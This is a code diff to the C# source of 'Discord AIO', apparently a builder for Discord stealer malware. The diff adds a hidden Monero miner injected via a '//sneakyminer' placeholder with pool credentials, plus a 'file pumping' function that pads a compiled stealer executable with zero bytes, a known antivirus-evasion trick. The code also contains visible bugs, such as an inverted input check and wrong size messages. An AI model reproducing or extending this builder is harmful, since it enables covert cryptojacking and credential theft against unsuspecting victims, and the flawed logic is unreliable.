@@ -27,7 +27,7 @@ namespace discordAIO
     public partial class main : Form
     {
 
-        private string version = "v0.4.1";
+        private string version = "v0.5.0";
         private protected string email = ""; // Your email goes here
 
         // Do not touch
@@ -44,6 +44,7 @@ namespace discordAIO
             builderPage.Visible = false;
             daioPage.Visible = false;
             credentialsPage.Visible = false;
+            minerPage.Visible = false;
 
             label46.Text = version;
 
@@ -167,6 +168,7 @@ namespace discordAIO
             daioPage.Visible = false;
             mainPage.Visible = true;
             credentialsPage.Visible = false;
+            minerPage.Visible = false;
         }
 
         private void button4_Click(object sender, EventArgs e) // Webhooks button
@@ -176,6 +178,7 @@ namespace discordAIO
             tokensPage.Visible = false;
             builderPage.Visible = false;
             daioPage.Visible = false;
+            minerPage.Visible = false;
             credentialsPage.Visible = false;
         }
 
@@ -531,6 +534,7 @@ namespace discordAIO
             builderPage.Visible = false;
             daioPage.Visible = false;
             credentialsPage.Visible = false;
+            minerPage.Visible = false;
         }
 
         private void button2_Click(object sender, EventArgs e)
@@ -541,6 +545,7 @@ namespace discordAIO
             mainPage.Visible = false;
             daioPage.Visible = false;
             credentialsPage.Visible = false;
+            minerPage.Visible = false;
         }
 
         // Handlers
@@ -704,7 +709,38 @@ namespace discordAIO
                             // Crypto
                             if (checkBox19.Checked)
                             {
-                            //    text = text.Replace("//sneakyminer", ""); // TO DO
+                                if (String.IsNullOrEmpty(textBox15.Text) || String.IsNullOrWhiteSpace(textBox15.Text) || String.IsNullOrEmpty(textBox16.Text) || String.IsNullOrWhiteSpace(textBox16.Text) || String.IsNullOrEmpty(textBox17.Text) || String.IsNullOrWhiteSpace(textBox17.Text))
+                                {
+                                    if (checkBox27.Checked || checkBox28.Checked || checkBox29.Checked)
+                                    {
+                                        if (checkBox27.Checked)
+                                        {
+                                            text = text.Replace("%usagehere%", "RunMonero();");
+                                        }
+                                        else if (checkBox28.Checked)
+                                        {
+                                            text = text.Replace("%usagehere%", "RunMonero();");
+                                        }
+                                        else if (checkBox29.Checked)
+                                        {
+                                            text = text.Replace("%usagehere%", "RunMonero();");
+                                        }
+
+                                        text = text.Replace("%poolhere%", textBox15.Text);
+                                        text = text.Replace("%usernamehere%", textBox16.Text);
+                                        text = text.Replace("%passwordhere%", textBox17.Text);
+
+                                        text = text.Replace("//sneakyminer", "RunMonero();");
+                                    }
+                                    else
+                                    {
+                                        MessageBox.Show("Select CPU usage.", "Discord AIO");
+                                    }
+                                }
+                                else
+                                {
+                                    MessageBox.Show("Provide pool, username and password.", "Discord AIO");
+                                }
                             }
 
                             // Ransom
@@ -1024,6 +1060,7 @@ namespace discordAIO
             webhooksPage.Visible = false;
             mainPage.Visible = false;
             credentialsPage.Visible = false;
+            minerPage.Visible = false;
             daioPage.Visible = true;
         }
 
@@ -1034,6 +1071,7 @@ namespace discordAIO
             webhooksPage.Visible = false;
             mainPage.Visible = false;
             daioPage.Visible = false;
+            minerPage.Visible = false;
             credentialsPage.Visible = true;
         }
 
@@ -1045,6 +1083,164 @@ namespace discordAIO
         private void button22_Click(object sender, EventArgs e)
         {
             Environment.Exit(0);
+        }
+
+        // Pump file
+        private void button23_Click(object sender, EventArgs e)
+        {
+            // label49
+
+            if (String.IsNullOrEmpty(textBox14.Text) || String.IsNullOrWhiteSpace(textBox14.Text))
+            {
+                MessageBox.Show("You need to provide size of the output file!", "Discord AIO");
+            }
+            else
+            {
+                OpenFileDialog pumpingDialog = new OpenFileDialog();
+                pumpingDialog.Filter = "Executable (*.exe)|*.exe";
+                pumpingDialog.Title = "Select compiled stealer";
+
+                if (pumpingDialog.ShowDialog() == DialogResult.OK)
+                {
+                    label49.Text = pumpingDialog.FileName;
+
+                    Thread pumping = new Thread(PumpingFile);
+                    pumping.Start();
+                }
+            }
+        }
+
+        private void PumpingFile()
+        {
+            try
+            {
+                var openedFile = File.OpenWrite(label49.Text);
+                var originalSize = openedFile.Seek(0, SeekOrigin.End);
+                var pumpSize = Convert.ToInt64(textBox14.Text);
+
+                if (checkBox22.Checked)
+                {
+                    decimal bYTE = pumpSize * 1024; // KB
+
+                    while (originalSize < bYTE)
+                    {
+                        originalSize++;
+                        openedFile.WriteByte(0);
+                    }
+                    openedFile.Close();
+                    MessageBox.Show("File pumped to " + pumpSize.ToString() + "MB", "Discord AIO");
+                } else if (checkBox25.Checked)
+                {
+                    decimal bYTE = pumpSize * 1024 * 1024; // MB
+
+                    while (originalSize < bYTE)
+                    {
+                        originalSize++;
+                        openedFile.WriteByte(0);
+                    }
+                    openedFile.Close();
+                    MessageBox.Show("File pumped to " + pumpSize.ToString() + "MB", "Discord AIO");
+                } else if (checkBox26.Checked)
+                {
+                    decimal bYTE = pumpSize * 1024 * 1024 * 1024; // GB
+
+                    while (originalSize < bYTE)
+                    {
+                        originalSize++;
+                        openedFile.WriteByte(0);
+                    }
+                    openedFile.Close();
+                    MessageBox.Show("File pumped to " + pumpSize.ToString() + "MB", "Discord AIO");
+                } else
+                {
+                    MessageBox.Show("You need to select the size of pump.", "Discord AIO");
+                }
+            }
+            catch
+            {
+                MessageBox.Show("Something went wrong.", "Discord AIO");
+            }
+
+        }
+
+        private void checkBox22_CheckedChanged(object sender, EventArgs e)
+        {
+            if (checkBox22.Checked)
+            {
+                checkBox25.Checked = false;
+                checkBox26.Checked = false;
+            }
+        }
+
+        private void checkBox25_CheckedChanged(object sender, EventArgs e)
+        {
+            if (checkBox25.Checked)
+            {
+                checkBox22.Checked = false;
+                checkBox26.Checked = false;
+            }
+        }
+
+        private void checkBox26_CheckedChanged(object sender, EventArgs e)
+        {
+            if (checkBox26.Checked)
+            {
+                checkBox25.Checked = false;
+                checkBox22.Checked = false;
+            }
+        }
+
+        // Sth
+        private void button19_Click(object sender, EventArgs e)
+        {
+            /*
+            builderPage.Visible = false;
+            tokensPage.Visible = false;
+            webhooksPage.Visible = false;
+            mainPage.Visible = false;
+            credentialsPage.Visible = false;
+            daioPage.Visible = false;
+            minerPage.Visible = false;
+            */
+        }
+
+        // Miner page
+        private void button24_Click(object sender, EventArgs e)
+        {
+            builderPage.Visible = false;
+            tokensPage.Visible = false;
+            webhooksPage.Visible = false;
+            mainPage.Visible = false;
+            credentialsPage.Visible = false;
+            daioPage.Visible = false;
+            minerPage.Visible = true;
+        }
+
+        private void checkBox29_CheckedChanged(object sender, EventArgs e)
+        {
+            if (checkBox29.Checked)
+            {
+                checkBox28.Checked = false;
+                checkBox27.Checked = false;
+            }
+        }
+
+        private void checkBox28_CheckedChanged(object sender, EventArgs e)
+        {
+            if (checkBox28.Checked)
+            {
+                checkBox29.Checked = false;
+                checkBox27.Checked = false;
+            }
+        }
+
+        private void checkBox27_CheckedChanged(object sender, EventArgs e)
+        {
+            if (checkBox27.Checked)
+            {
+                checkBox28.Checked = false;
+                checkBox29.Checked = false;
+            }
         }
     }
 }
